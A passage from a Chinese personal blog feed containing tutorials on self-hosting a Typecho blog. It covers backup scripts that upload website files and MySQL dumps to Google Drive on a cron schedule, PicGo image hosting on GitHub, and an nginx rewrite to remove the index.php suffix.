NameOfFolder=(&quot;default&quot;) # If you have multiple folders you need to back up</span></span><br><span class="line">NameOfFolder=<span class="string">&quot;default&quot;</span></span><br><span class="line">SourceOfFolder=<span class="string">&quot;/home/wwwroot/&quot;</span></span><br><span class="line">BackupLocation=<span class="string">&quot;/home/wwwbackups&quot;</span></span><br><span class="line">date=$(date +<span class="string">&quot;%Y-%m-%d&quot;</span>)</span><br><span class="line"><span class="comment">##That mean, you will Backup the folder /home/wwwroot/yourdomain.com and will save into Folder /backups</span></span><br><span class="line"><span class="comment">## ----------------------LOG FILE---------------------------------##</span></span><br><span class="line">LOG_FILE=backups.log</span><br><span class="line"><span class="comment">## ----------------------run code-------------------------------##</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Create Backup Floder</span></span><br><span class="line"><span class="keyword">if</span> [ ! -d <span class="variable">$BackupLocation</span> ]; <span class="keyword">then</span></span><br><span class="line">mkdir -p <span class="variable">$BackupLocation</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Delete All backed files</span></span><br><span class="line">find <span class="variable">$BackupLocation</span>/*.zip -mtime +10 -<span class="built_in">exec</span> rm &#123;&#125; \;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Name of the Backup File</span></span><br><span class="line"><span class="keyword">for</span> fd <span class="keyword">in</span> <span class="variable">$NameOfFolder</span>; <span class="keyword">do</span></span><br><span class="line">file=<span class="variable">$fd</span>-<span class="variable">$date</span>.zip</span><br><span class="line"></span><br><span class="line"><span class="comment"># Zip the Folder you will want to Backup</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Starting to zip the folder and files&quot;</span></span><br><span class="line"><span class="built_in">cd</span> <span class="variable">$SourceOfFolder</span></span><br><span class="line">zip -r <span class="variable">$BackupLocation</span>/<span class="variable">$file</span> <span class="variable">$fd</span></span><br><span class="line">sleep 5s</span><br><span class="line"></span><br><span class="line"><span class="comment">##Process Upload Files to Google Drive</span></span><br><span class="line">gdrive upload --delete <span class="variable">$BackupLocation</span>/<span class="variable">$file</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Check upload success or not and mail to user</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">test</span> $? = 0</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Your Data Successfully Uploaded to the Google Drive!&quot;</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;Your Data Successfully created and uploaded to the Google Drive!&quot;</span> | mail -s <span class="string">&quot;Your VPS Backup from <span class="variable">$date</span>&quot;</span> zhang.xingrui@foxmail.com</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Error in Your Data Upload to Google Drive&quot;</span> &gt; <span class="variable">$LOG_FILE</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><p>再建立<code> vi googledrive-mysql.sh</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment">##-----------------------Database Access--------------------------##</span></span><br><span class="line">DB_NAME=<span class="string">&quot;typecho&quot;</span></span><br><span class="line">DB_USER=<span class="string">&quot;root&quot;</span></span><br><span class="line">DB_PASSWORD=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment">##-----------------------Folder Web or Folder you want to backup--------------------------##</span></span><br><span class="line"><span class="comment"># NameOfFolder=(&quot;default&quot;) # If you have multiple folders you need to back up</span></span><br><span class="line">NameOfFolder=<span class="string">&quot;default&quot;</span></span><br><span class="line">SourceOfFolder=<span class="string">&quot;/home/wwwroot/&quot;</span></span><br><span class="line">BackupLocation=<span class="string">&quot;/home/wwwbackups&quot;</span></span><br><span class="line">date=$(date +<span class="string">&quot;%Y-%m-%d&quot;</span>)</span><br><span class="line"><span class="comment">##That mean, you will Backup the folder /home/wwwroot/yourdomain.com and will save into Folder /backups</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## ----------------------LOG FILE---------------------------------##</span></span><br><span class="line">LOG_FILE=backups.log</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ ! -d <span class="variable">$BackupLocation</span> ]; <span class="keyword">then</span></span><br><span class="line">mkdir -p <span class="variable">$BackupLocation</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">find <span class="variable">$BackupLocation</span>/*.zip -mtime +10 -<span class="built_in">exec</span> rm &#123;&#125; \;</span><br><span class="line"><span class="keyword">for</span> fd <span class="keyword">in</span> <span class="variable">$NameOfFolder</span>; <span class="keyword">do</span></span><br><span class="line"><span class="comment"># Name of the Backup File</span></span><br><span class="line">file=<span class="variable">$fd</span>-<span class="variable">$date</span>.zip</span><br><span class="line"></span><br><span class="line"><span class="comment"># Tackle databases</span></span><br><span class="line">mysqldump -u <span class="variable">$DB_USER</span> -p<span class="variable">$DB_PASSWORD</span> <span class="variable">$DB_NAME</span> &gt; <span class="variable">$BackupLocation</span>/<span class="variable">$date</span>-<span class="variable">$DB_NAME</span>.sql</span><br><span class="line">sleep 5s</span><br><span class="line"></span><br><span class="line"><span class="comment">##Process Upload Databases file to Google Drive</span></span><br><span class="line">gdrive upload --delete <span class="variable">$BackupLocation</span>/<span class="variable">$date</span>-<span class="variable">$DB_NAME</span>.sql</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">test</span> $? = 0</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Your Data Successfully Uploaded to the Google Drive!&quot;</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;Your Data Successfully created and uploaded to the Google Drive!&quot;</span> | mail -s <span class="string">&quot;Your VPS Backup from <span class="variable">$date</span>&quot;</span> zhang.xingrui@foxmail.com</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Error in Your Data Upload to Google Drive&quot;</span> &gt; <span class="variable">$LOG_FILE</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><p>最后给两个文件执行权限:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x googledrive-mysql.sh</span><br><span class="line">chmod +x googledrive-website.sh</span><br></pre></td></tr></table></figure><p>现在你可以通过<code>bash googledrive-mysql.sh</code>和<code> bash googledrive-website.sh</code>来测试。</p><h3 id="2-3-设置自动备份"><a href="#2-3-设置自动备份" class="headerlink" title="2.3 设置自动备份"></a>2.3 设置自动备份</h3><p>这里要使用到crontab来进行备份设置，执行以下命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;crontab</span><br></pre></td></tr></table></figure><p>添加如下两行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0  2  *  *  * root  bash &#x2F;home&#x2F;wwwbackups&#x2F;googledrive-mysql.sh# 每天凌晨2点备份数据库文件</span><br><span class="line">0  2  *  *  1 root bash &#x2F;home&#x2F;wwwbackups&#x2F;googledrive-website.sh# 每个星期1凌晨2点备份整个网站文件</span><br></pre></td></tr></table></figure><p>最后重启crond服务即可，可能并不需要重启：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service crond restart</span><br></pre></td></tr></table></figure><h2 id="3-恢复备份"><a href="#3-恢复备份" class="headerlink" title="3. 恢复备份"></a>3. 恢复备份</h2><p>有时候需要更换主机，那么就需要重新搭建一下博客系统。具体步骤如下:</p><ol><li><p>如<a href="https://www.ravenxrz.ink/archives/build-your-own-blog-series-of-tutorials-from-scratch-blog-system-building.html">本系列教程一</a>，购买<code>vps</code>，安装 <a href="https://www.ravenxrz.ink/go/aHR0cHM6Ly9sbm1wLm9yZy8=">lnmp</a>，<strong>不用安装typecho</strong>。</p></li><li><p>安装本篇教程所说的<code>gdrive</code>，并授权。</p></li><li><p>通过<code>gdrive</code>，下载两个备份文件，一个是数据库<code>sql</code>，一个是整个网站文件。</p></li><li><p>将网站文件解压并放置到<code>/home/wwwroot/</code>目录下，尝试在浏览器中打开<code>http://youip</code>，查看是否已恢复相关主题和插件。**如果遇到404情况，请参考本系列<a href="https://www.ravenxrz.ink/archives/build-your-own-blog-series-of-tutorials-from-scratch-blog-system-building.html">教程一的FAQ小结</a>**。</p></li><li><p>执行以下命令，恢复数据库。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u数据库用户名 -p数据库密码 数据库名（一般为typecho) &lt; 第3步中下载的sql文件路径</span><br></pre></td></tr></table></figure><p><strong>注意，执行上述步骤后，所有设置都会还原，包括你的博客系统的登陆密码。</strong></p></li></ol><p>6.再次打开<span class="exturl" data-url="aHR0cDovL3lvdWlwLOafpeeci+aYr+WQpuW3sue7j+aBouWkjeebuOWFs+iuvue9ri4v" title="http://youip,查看是否已经恢复相关设置./">http://youip，查看是否已经恢复相关设置。<i class="fa fa-external-link"></i></span><br>7.域名更换，打开你购买域名的控制面板，更改解析目标。</p><p>额外恢复问题：</p><ol><li>去掉<code>index</code>后缀？参考<a href="https://www.ravenxrz.ink/archives/build-your-own-blog-tutorial-series-from-scratch-4-remove-annoying-index-php-suffixes-and-introductions-to-common-plugins-1.html">本系列教程四</a></li><li><code>CommentToMail</code>插件失效？重新配置STMP密码，参考<a href="https://www.ravenxrz.ink/archives/build-your-own-blog-tutorial-series-from-scratch-4-remove-annoying-index-php-suffixes-and-introductions-to-common-plugins-1.html">本系列教程四</a>。</li><li>重建博客系统备份？参考本篇教程第2小结。</li></ol><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><span class="exturl" data-url="aHR0cHM6Ly93d3cubW9lcmF0cy5jb20vYXJjaGl2ZXMvMjk2Lw==" title="https://www.moerats.com/archives/296/">Gdrive：Linux下谷歌网盘同步工具、自动备份VPS文件到Google Drive<i class="fa fa-external-link"></i></span></p>]]></content>
      
      
      <categories>
          
          <category> 博客搭建 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>从零开始搭建属于自己的博客系列教程五-图床选择与博客迁移</title>
      <link href="/archives/3cc5aa32.html"/>
      <url>/archives/3cc5aa32.html</url>
      
        <content type="html"><![CDATA[<h2 id="1-写在最前面"><a href="#1-写在最前面" class="headerlink" title="1.  写在最前面"></a>1.  写在最前面</h2><blockquote><p>折腾了整整一个五一，总算是完成了自己的博客系统。为了给想要搭建自己的博客，但是又和我一样是技术小白的人铺点路，所以准备开个博客搭建的系列教程，避免后来人像我一样走了一大堆弯路。</p></blockquote><p>先贴上自己的博客网站：<a href="https://www.ravenxrz.ink/">https://www.ravenxrz.ink</a>   </p><a id="more"></a><p>系列教程目录：</p><ul><li><a href="https://www.ravenxrz.ink/archives/b5eb44b9.html">从零开始搭建属于自己的博客系列教程零 – 绪论</a></li><li><a href="https://www.ravenxrz.ink/archives/4c781aa7.html">从零开始搭建属于自己的博客系列教程一 – 博客系统搭建</a></li><li><a href="https://www.ravenxrz.ink/archives/1cbfa5af.html">从零开始搭建属于自己的博客系列教程二 – 域名绑定</a></li><li><a href="https://www.ravenxrz.ink/archives/9f4d945c.html">从零开始搭建属于自己的博客系列教程三 – 主题选择与CommentToMail插件介绍</a></li><li><a href="https://www.ravenxrz.ink/archives/e8deae94.html">从零开始搭建属于自己的博客系列教程四 – 去掉烦人的index.php后缀与常用插件介绍</a></li><li><a href="https://www.ravenxrz.ink/archives/3cc5aa32.html">从零开始搭建属于自己的博客系列教程五 – 图床选择与博客迁移</a></li><li><a href="https://www.ravenxrz.ink/archives/11c4d80.html">从零开始搭建属于自己的博客系列教程六 – 博客系统备份</a></li><li><a href="https://www.ravenxrz.ink/archives/1eb3d9.html">从零开始搭建属于自己的博客系列教程七 – 开启全站HTTPS</a></li></ul><h2 id="2-图床选择"><a href="#2-图床选择" class="headerlink" title="2. 图床选择"></a>2. 图床选择</h2><p>写博客避免不了上传图片，以前在csdn和简书上写文章，图片是自动保存在他们的服务器的，现在你要自己搭建博客了，那么图床就是个问题了。从百度来看，常用图床有：</p><ul><li>七牛图床:速度快，稳定，但有空间、流量限制。如果你使用的国内备案了的服务器，那么推荐你使用这个，因为我是使用的国外服务器，所以虽然很想用，但是它的CDN加速，必须要要国内的，so..我就放弃了。</li><li>微博图床: 无限流量、无限空间、稳定自带CDN加速。我本来就准备选择这个了，并且同上床了好多张图片，<strong>然而上个月末(2019/04末)，微博已关闭这个服务</strong>，具体来说是防止盗链（因为微博并没有这个功能，只是广大好友另辟蹊径使用了所谓的“微博图床”）,所以没办法，无法使用。</li><li>Github图床：免费、无限流量、有限空间，速度慢但稳定。<strong>最终我选择的是Github图床</strong>。</li></ul><h2 id="3-图床上传工具"><a href="#3-图床上传工具" class="headerlink" title="3 图床上传工具"></a>3 图床上传工具</h2><p>强烈推荐<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL01vbHVuZXJmaW5uL1BpY0dv" title="https://github.com/Molunerfinn/PicGo">PicGo<i class="fa fa-external-link"></i></span>,三平台支持下载，支持常用主流图床。这里以github图床为例，进行讲解：</p><h3 id="3-1-创建github博客图片仓库"><a href="#3-1-创建github博客图片仓库" class="headerlink" title="3.1 创建github博客图片仓库"></a>3.1 创建github博客图片仓库</h3><p><img data-src="https://pic.superbed.cn/item/5cfbb5ba451253d178d9ce40.png"></p><p>如图配置</p><p><img data-src="https://pic.superbed.cn/item/5cfbb5bc451253d178d9ce7a.png"></p><p>这里我的仓库名为<code>BlogPic</code>。</p><h3 id="3-2-创建github-token"><a href="#3-2-创建github-token" class="headerlink" title="3.2 创建github token"></a>3.2 创建github token</h3><p>进入Settings-&gt;Developer settings:</p><p><img data-src="https://pic.superbed.cn/item/5cfbb5bd451253d178d9cebc.png"></p><p>会让你验证密码，输入即可。</p><p><img data-src="https://pic.superbed.cn/item/5cfbb5bf451253d178d9cf05.png"></p><p>token描述随意，<strong>记得勾选下面repo选项</strong>，然后确定生成。</p><p>最后会有类似下图的token：</p><p><img data-src="https://pic.superbed.cn/item/5cfbb5c0451253d178d9cf60.png"></p><p>上图来源：<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3llZmNpb24vYXJ0aWNsZS9kZXRhaWxzLzg4NDEyMDI1" title="https://blog.csdn.net/yefcion/article/details/88412025">https://blog.csdn.net/yefcion/article/details/88412025<i class="fa fa-external-link"></i></span></p><p><strong>复制下来，注意这个链接仅会显示一次。</strong></p><h3 id="3-3-安装PicGo并进行配置"><a href="#3-3-安装PicGo并进行配置" class="headerlink" title="3.3 安装PicGo并进行配置"></a>3.3 安装PicGo并进行配置</h3><p>安装PicGo就不细说了，上github下载安装包，下一步到底就ok。</p><p>现在来说说如何配置Github图床：</p><p><img data-src="https://pic2.superbed.cn/item/5cfbb5c1451253d178d9cf95.png"></p><p>最后的自定义域名<code>https://raw.githubusercontent.com/[仓库名]/master</code>。如我的域名为:<code>https://raw.githubusercontent.com/ravenxrz/BlogPic/master</code></p><p>然后就可以欢快的上传图片了。有三种方式上传</p><ul><li>快捷键上传</li><li>gui界面选择文件（支持多文件）上传</li><li>支持剪贴板上传（点击gui或者直接用快捷键上传），这个功能真心赞。</li></ul><h2 id="4-博客迁移"><a href="#4-博客迁移" class="headerlink" title="4.  博客迁移"></a>4.  博客迁移</h2><p>为了防止出现类似微博的防盗链情况，建议把所有曾经的博文图片全部重新上传。但是一张张的重新上传实在太麻烦，好在picgo有插件，支持转移。</p><p>插件官方：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1BpY0dvL3BpY2dvLXBsdWdpbi1waWMtbWlncmF0ZXI=" title="https://github.com/PicGo/picgo-plugin-pic-migrater">https://github.com/PicGo/picgo-plugin-pic-migrater<i class="fa fa-external-link"></i></span></p><p>虽然有GUI版本的插件，但是我用过一个晚上，第二天准备再用时就报错了，所以这里推荐使用命令行版本的插件。当然了picgo也得重新安装CIL版本的。</p><p>报错信息如下：</p><p><img data-src="https://pic2.superbed.cn/item/5cfbb5c3451253d178d9cfc3.png"></p><h3 id="4-1-重新安装picgo-CIL版本"><a href="#4-1-重新安装picgo-CIL版本" class="headerlink" title="4.1 重新安装picgo CIL版本"></a>4.1 重新安装picgo CIL版本</h3><p>先安装<span class="exturl" data-url="aHR0cHM6Ly9ub2RlanMub3JnL2VuLw==" title="https://nodejs.org/en/">Node.js<i class="fa fa-external-link"></i></span>，然后打开命令行，执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install picgo -g</span><br></pre></td></tr></table></figure><p>接着执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">picgo install pic-migrater</span><br><span class="line">picgo set plugin pic-migrater</span><br></pre></td></tr></table></figure><p>会出现一个配置界面：参考<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1BpY0dvL3BpY2dvLXBsdWdpbi1waWMtbWlncmF0ZXIvYmxvYi9tYXN0ZXIvUkVBRE1FX0NOLm1k" title="https://github.com/PicGo/picgo-plugin-pic-migrater/blob/master/README_CN.md">https://github.com/PicGo/picgo-plugin-pic-migrater/blob/master/README_CN.md<i class="fa fa-external-link"></i></span></p><p>然后还需要配置config.json文件，文件在<code>C:\Users\用户名\.picgo目录下</code>，设定图床。这里给个样例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;picBed&quot;: &#123;</span><br><span class="line">    &quot;current&quot;: &quot;github&quot;,</span><br><span class="line">    &quot;proxy&quot;: &quot;&quot;,</span><br><span class="line">    &quot;github&quot;: &#123;</span><br><span class="line">      &quot;repo&quot;: &quot;ravenxrz&#x2F;BlogPic&quot;,# 你的仓库</span><br><span class="line">      &quot;token&quot;: &quot;xxx&quot;,# token</span><br><span class="line">      &quot;path&quot;: &quot;img&#x2F;&quot;,# 保存路径</span><br><span class="line">      &quot;customUrl&quot;: &quot;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;ravenxrz&#x2F;BlogPic&#x2F;master&quot;,# url</span><br><span class="line">      &quot;branch&quot;: &quot;master&quot;#分支</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;picgoPlugins&quot;: &#123;</span><br><span class="line">    &quot;picgo-plugin-pic-migrater&quot;: true</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;picgo-plugin-pic-migrater&quot;: &#123;</span><br><span class="line">    &quot;newFilePrefix&quot;: &quot;_new&quot;,</span><br><span class="line">    &quot;include&quot;: &quot;csdnimg&quot;,</span><br><span class="line">    &quot;exclude&quot;: &quot;&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>安装完成后，即可进行迁移，例如有一个md文档叫做test.md</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Examples:</span><br><span class="line">  # migrate file or files</span><br><span class="line">  $ picgo migrate .&#x2F;test.md </span><br></pre></td></tr></table></figure><p>如果想批量迁移（不建议使用，测试发现会有会出现文章混乱的情况），建立一个文件夹入test，把md文件丢进去，然后执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># migrate markdown files in folder</span><br><span class="line">$ picgo migrate .&#x2F;test&#x2F;</span><br></pre></td></tr></table></figure><p>然后就ok了。</p><h3 id="4-2-额外的一些事情"><a href="#4-2-额外的一些事情" class="headerlink" title="4.2 额外的一些事情"></a>4.2 额外的一些事情</h3><ol><li>提醒，迁移简书的图片时，需要将链接的后半段给去掉，如一个链接</li></ol><p>(<span class="exturl" data-url="aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8zMjEzNTM4LTczYmE5YTEzM2ZmODMyMDQucG5nP2ltYWdlTW9ncjIvYXV0by1vcmllbnQvc3RyaXAlN0NpbWFnZVZpZXcyLzIvdy8xMjQw" title="https://upload-images.jianshu.io/upload_images/3213538-73ba9a133ff83204.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">https://upload-images.jianshu.io/upload_images/3213538-73ba9a133ff83204.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240<i class="fa fa-external-link"></i></span>)</p><p>那么我们需要将从?起到末尾全部去掉。如何批量去掉呢。可以使用notepad++或者sublime这种支持正则表达式的编辑器，然后ctrl+H。</p><p>查找: \?.*\)</p><p>替换为:\)</p><ol start="2"><li>同理，csdn，也可以用正则表达式，替换方式相同</li></ol><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3llZmNpb24vYXJ0aWNsZS9kZXRhaWxzLzg4NDEyMDI1" title="https://blog.csdn.net/yefcion/article/details/88412025">PicGo + GitHub 搭建个人图床工具<i class="fa fa-external-link"></i></span></li></ul>]]></content>
      
      
      <categories>
          
          <category> 博客搭建 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>从零开始搭建属于自己的博客系列教程四-去掉烦人的index-php后缀与常用插件介绍</title>
      <link href="/archives/e8deae94.html"/>
      <url>/archives/e8deae94.html</url>
      
        <content type="html"><![CDATA[<h2 id="1-写在最前面"><a href="#1-写在最前面" class="headerlink" title="1.  写在最前面"></a>1.  写在最前面</h2><blockquote><p>折腾了整整一个五一，总算是完成了自己的博客系统。为了给想要搭建自己的博客，但是又和我一样是技术小白的人铺点路，所以准备开个博客搭建的系列教程，避免后来人像我一样走了一大堆弯路。</p></blockquote><p>先贴上自己的博客网站：<a href="https://www.ravenxrz.ink/">https://www.ravenxrz.ink</a>   </p><a id="more"></a><p>系列教程目录：</p><ul><li><a href="https://www.ravenxrz.ink/archives/b5eb44b9.html">从零开始搭建属于自己的博客系列教程零 – 绪论</a></li><li><a href="https://www.ravenxrz.ink/archives/4c781aa7.html">从零开始搭建属于自己的博客系列教程一 – 博客系统搭建</a></li><li><a href="https://www.ravenxrz.ink/archives/1cbfa5af.html">从零开始搭建属于自己的博客系列教程二 – 域名绑定</a></li><li><a href="https://www.ravenxrz.ink/archives/9f4d945c.html">从零开始搭建属于自己的博客系列教程三 – 主题选择与CommentToMail插件介绍</a></li><li><a href="https://www.ravenxrz.ink/archives/e8deae94.html">从零开始搭建属于自己的博客系列教程四 – 去掉烦人的index.php后缀与常用插件介绍</a></li><li><a href="https://www.ravenxrz.ink/archives/3cc5aa32.html">从零开始搭建属于自己的博客系列教程五 – 图床选择与博客迁移</a></li><li><a href="https://www.ravenxrz.ink/archives/11c4d80.html">从零开始搭建属于自己的博客系列教程六 – 博客系统备份</a></li><li><a href="https://www.ravenxrz.ink/archives/1eb3d9.html">从零开始搭建属于自己的博客系列教程七 – 开启全站HTTPS</a></li></ul><h2 id="2-去掉烦人的index-php后缀"><a href="#2-去掉烦人的index-php后缀" class="headerlink" title="2. 去掉烦人的index.php后缀"></a>2. 去掉烦人的index.php后缀</h2><p>不知道你有没有注意，你的博客url中总是会有index.php后缀，本篇就教你如何去掉它。</p><p>进入typecho后台管理，后台设置–永久链接设置–启用。如果提示你无法启动，那么再往下看。</p><p>更改nginx配置文件，具体操作如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf</span><br></pre></td></tr></table></figure><p>找到server字段，然后再其中添加：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">location &#x2F; &#123;</span><br><span class="line"></span><br><span class="line">    if (!-e $request_filename) &#123;</span><br><span class="line">        rewrite  ^&#x2F;(.*)$  &#x2F;index.php&#x2F;$1  last;</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img data-src="https://pic.superbed.cn/item/5cfbace9451253d178d94620.png"></p><p>即可。<br><strong>最后再去永久链接设置里启用就好了。</strong></p><h2 id="3-常用插件介绍"><a href="#3-常用插件介绍" class="headerlink" title="3. 常用插件介绍"></a>3. 常用插件介绍</h2><ul><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0NvcHRlcmZseS9Db2RlSGlnaGxpZ2h0ZXItZm9yLVR5cGVjaG8=" title="https://github.com/Copterfly/CodeHighlighter-for-Typecho">CodeHighlighter<i class="fa fa-external-link"></i></span>: 代码高亮插件：</li><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuYmlqaXYuY29tL3Vzci91cGxvYWRzLzIwMTgvMDQvMjc4MTEzMTk3Ni56aXA=" title="https://www.bijiv.com/usr/uploads/2018/04/2781131976.zip">BaiduSlug<i class="fa fa-external-link"></i></span>: 给你的博客url改成对应标题的英文名，这么说不好理解，直接上图吧</li><li><img data-src="https://pic2.superbed.cn/item/5cfbaceb451253d178d94655.png"></li><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2hpdG9wL3R5cGVjaG9TdGlja3k=" title="https://github.com/hitop/typechoSticky">Sticky<i class="fa fa-external-link"></i></span>: 文章置顶</li><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2JlbnpCcmFrZS9TaG9ydExpbmtz" title="https://github.com/benzBrake/ShortLinks">ShortLinks<i class="fa fa-external-link"></i></span>：博文外链转内链，避免权重流失。</li></ul><p>下面两个是做SEO的，方便百度收录，我没用，所以自己研究吧。</p><ul><li>BaiduLinkSeo</li><li>BaiduSubmit</li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><span class="exturl" data-url="aHR0cHM6Ly9zZW9ub2NvLmNvbS90eXBlY2hvLXJlbW92ZS1pbmRleC1waHA=" title="https://seonoco.com/typecho-remove-index-php">Typecho去掉index.php<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuYmlqaXYuY29tL3QvNDY=" title="https://www.bijiv.com/t/46">Typecho自动翻译slug插件<i class="fa fa-external-link"></i></span></li></ul>]]></content>
      
      
      <categories>
          
          <category> 博客搭建 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>从零开始搭建属于自己的博客系列教程三-主题选择与CommentToMail插件介绍</title>
      <link href="/archives/9f4d945c.html"/>
      <url>/archives/9f4d945c.html</url>
      
        <content type="html"><![CDATA[<h2 id="1-写在最前面"><a href="#1-写在最前面" class="headerlink" title="1.  写在最前面"></a>1.  写在最前面</h2><blockquote><p>折腾了整整一个五一，总算是完成了自己的博客系统。为了给想要搭建自己的博客，但是又和我一样是技术小白的人铺点路，所以准备开个博客搭建的系列教程，避免后来人像我一样走了一大堆弯路。</p></blockquote><p>先贴上自己的博客网站：<a href="https://www.ravenxrz.ink/">https://www.ravenxrz.ink</a>   </p><p>系列教程目录：</p><ul><li><a href="https://www.ravenxrz.ink/archives/start-from-scratch-to-build-your-own-blog-series-of-tutorials-zerointroduction.html">从零开始搭建属于自己的博客系列教程零 – 绪论</a></li><li><a href="https://www.ravenxrz.ink/archives/build-your-own-blog-series-of-tutorials-from-scratch-blog-system-building.html">从零开始搭建属于自己的博客系列教程一 – 博客系统搭建</a></li><li><a href="https://www.ravenxrz.ink/archives/start-from-scratch-to-build-your-own-blog-tutorial-series-ii-domain-name-binding.html">从零开始搭建属于自己的博客系列教程二 – 域名绑定</a></li><li><span class="exturl" 